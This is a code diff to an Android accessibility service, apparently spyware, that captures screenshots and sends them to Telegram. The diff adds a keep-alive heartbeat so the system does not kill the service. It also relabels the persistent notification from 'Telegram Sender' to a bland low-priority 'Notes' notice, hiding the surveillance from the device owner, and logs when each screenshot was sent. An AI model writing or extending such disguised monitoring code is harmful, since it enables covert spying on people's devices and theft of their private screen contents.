@@ -154,7 +154,20 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
     private fun startCaptureLoop() {
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
+            // Heartbeat loop to prevent idle termination
+            launch {
+                while (isActive) {
+                    updateForegroundNotification()
+                    delay(60000) // Every 1 minute
+                }
+            }
+
             while (isActive) {
+                val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+                if (!pref.getBoolean("is_monitoring_active", false)) {
+                    delay(5000)
+                    continue
+                }
                 if (!TokenManager.isTokenValid(this@TelegramService)) {
                      delay(60000)
                      continue
@@ -453,12 +466,26 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
                     Log.e("TelegramService", "Failed to send photo: ${response.code}")
                 } else {
                     Log.d("TelegramService", "Photo sent successfully (${byteArray.size} bytes)")
+                    getSharedPreferences("tg_pref", MODE_PRIVATE).edit().putLong("last_screenshot_sent", System.currentTimeMillis()).apply()
                 }
             }
         } catch (e: IOException) {
             Log.e("TelegramService", "Network error", e)
         }
     }
+    private fun updateForegroundNotification() {
+        val notification: Notification = NotificationCompat.Builder(this, "TelegramSenderChannel")
+            .setContentTitle("Notes")
+            .setContentText("Background service active")
+            .setSmallIcon(R.mipmap.ic_launcher)
+            .setSubText("Status: Running")
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .build()
+        
+        val manager = getSystemService(NotificationManager::class.java)
+        manager.notify(1, notification)
+    }
+
     private fun startForegroundServiceNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channelId = "TelegramSenderChannel"
@@ -469,8 +496,8 @@ class TelegramService : AccessibilityService(), LifecycleOwner {
         }
 
         val notification: Notification = NotificationCompat.Builder(this, "TelegramSenderChannel")
-            .setContentTitle("Telegram Sender")
-            .setContentText("Running in background...")
+            .setContentTitle("Notes")
+            .setContentText("Background service active")
             .setSmallIcon(R.mipmap.ic_launcher)
             .build()
 
